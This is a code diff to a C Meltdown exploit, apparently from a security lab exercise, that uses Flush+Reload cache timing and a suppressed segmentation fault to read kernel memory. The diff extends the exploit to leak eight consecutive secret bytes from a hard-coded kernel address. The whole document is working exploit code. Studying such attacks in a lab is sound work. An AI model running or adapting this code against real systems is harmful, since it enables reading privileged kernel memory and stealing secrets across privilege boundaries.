@@ -44,7 +44,7 @@ void reloadSideChannelImproved()
 }
 /*********************** Flush + Reload ************************/
 
-void meltdown_asm(unsigned long kernel_data_addr)
+void meltdown_asm(unsigned long kernel_data_addr,int r)
 {
    char kernel_data = 0;
    
@@ -60,7 +60,7 @@ void meltdown_asm(unsigned long kernel_data_addr)
    ); 
     
    // The following statement will cause an exception
-   kernel_data = *(char*)kernel_data_addr;  
+   kernel_data = *(char*)(kernel_data_addr+r);  
    array[kernel_data * 4096 + DELTA] += 1;              
 }
 
@@ -71,7 +71,7 @@ static void catch_segv()
    siglongjmp(jbuf, 1);
 }
 
-int main()
+int find_secret(int r)
 {
   int i, j, ret = 0;
   
@@ -100,7 +100,7 @@ int main()
 	for (j = 0; j < 256; j++) 
 		_mm_clflush(&array[j * 4096 + DELTA]);
 
-	if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xfb61b000); }
+	if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(0xfaf57000,r); }
 
 	reloadSideChannelImproved();
   }
@@ -115,4 +115,13 @@ int main()
   printf("The number of hits is %d\n", scores[max]);
 
   return 0;
+}
+
+int main()
+{
+	for (int i=0;i<8;i++)
+	{
+		find_secret(i);
+	}
+	return 0;
 }
